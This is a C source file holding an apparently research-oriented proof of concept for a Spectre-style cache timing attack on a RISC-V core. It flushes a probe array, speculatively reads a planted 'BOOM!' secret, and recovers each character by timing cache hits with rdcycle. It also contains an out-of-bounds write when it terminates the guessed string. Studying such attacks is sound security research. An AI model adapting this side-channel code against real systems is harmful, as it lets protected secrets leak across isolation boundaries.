#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define CACHE_HIT_THRESHOLD 50
#define ATTACK_SAME_ROUNDS 10
#define SECRET_SZ 5

uint8_t array[256 * L1_BLOCK_SZ_BYTES];
char* secretString = "BOOM!";


void specFunc(char *addr){
    extern void frameDump();
    uint64_t dummy = 0;
    frameDump();
    char secret = *addr;
    dummy = array[secret * L1_BLOCK_SZ_BYTES];
    dummy = rdcycle();
}



int main(void){

    static uint64_t results[256];
    uint64_t start, diff;
    uint8_t dummy = 0;

    char guessedSecret[SECRET_SZ];

    for(uint64_t i = 0; i < SECRET_SZ; i++) {

        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx)
                results[cIdx] = 0;

        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound) {

            flushCache((uint64_t)array, sizeof(array));

             specFunc(secretString + i);
            __asm__ volatile ("ld fp, -16(sp)");

            for (uint64_t i = 0; i < 256; ++i){
                    start = rdcycle();
                    dummy &= array[i * L1_BLOCK_SZ_BYTES];
                    diff = (rdcycle() - start);
                    if (diff < CACHE_HIT_THRESHOLD)
                        results[i] += 1;
            }
        }

        uint64_t max = results[0], index = 0;
        for (uint64_t i = 1; i < 256; i++)
            if (max < results[i]) {
                max = results[i];
                index = i;
            }
        printf("The attacker guessed character %c %ld times.\n", index,  max);

        guessedSecret[i] = index;

    }

    guessedSecret[SECRET_SZ] = 0;

    printf("The guessed secret is %s\n", guessedSecret);

    return 0;
}
